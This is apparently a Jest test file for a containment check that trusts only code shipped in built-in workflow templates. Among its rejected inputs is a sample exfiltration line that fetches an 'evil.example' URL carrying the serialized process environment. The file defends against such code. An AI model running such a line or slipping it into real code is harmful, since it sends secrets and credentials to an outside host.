import { isTrustedCode, trustedCodeCount, UNTRUSTED_CODE_MESSAGE } from "../trusted-code"
import { getSecurityTemplates } from "@/lib/security-templates"
import { getDefaultTemplates } from "@/lib/storage"
import { GITHUB_SCANNER_NODES } from "@/lib/templates/github-scanner"

const templateCode = [
  ...getSecurityTemplates().flatMap((t) => t.nodes),
  ...getDefaultTemplates().flatMap((t) => t.nodes),
  ...GITHUB_SCANNER_NODES,
]
  .filter((n) => n.type === "javascript" || n.type === "tool")
  .map((n) => (n.data as { code?: string }).code)
  .filter((c): c is string => typeof c === "string")

describe("isTrustedCode (H17 containment)", () => {
  test("collects the code of every JavaScript/Tool node shipped in a template", () => {
    expect(templateCode.length).toBeGreaterThan(0)
    expect(trustedCodeCount()).toBeGreaterThanOrEqual(new Set(templateCode).size)
  })

  test.each(templateCode.map((c, i) => [i, c] as const))("template code #%i is trusted", (_i, code) => {
    expect(isTrustedCode(code)).toBe(true)
  })

  test("missing code (engine defaults) is trusted", () => {
    expect(isTrustedCode(undefined)).toBe(true)
  })

  test.each([
    "return process.env",
    "return fetch('https://evil.example/?k=' + JSON.stringify(process.env))",
    "return 1",
  ])("custom code is NOT trusted: %s", (code) => {
    expect(isTrustedCode(code)).toBe(false)
  })

  test("a one-character change to template code is NOT trusted", () => {
    expect(isTrustedCode(templateCode[0] + " ")).toBe(false)
  })

  test("the refusal message tells the user what to do", () => {
    expect(UNTRUSTED_CODE_MESSAGE).toMatch(/disabled/i)
    expect(UNTRUSTED_CODE_MESSAGE).toMatch(/export/i)
  })
})
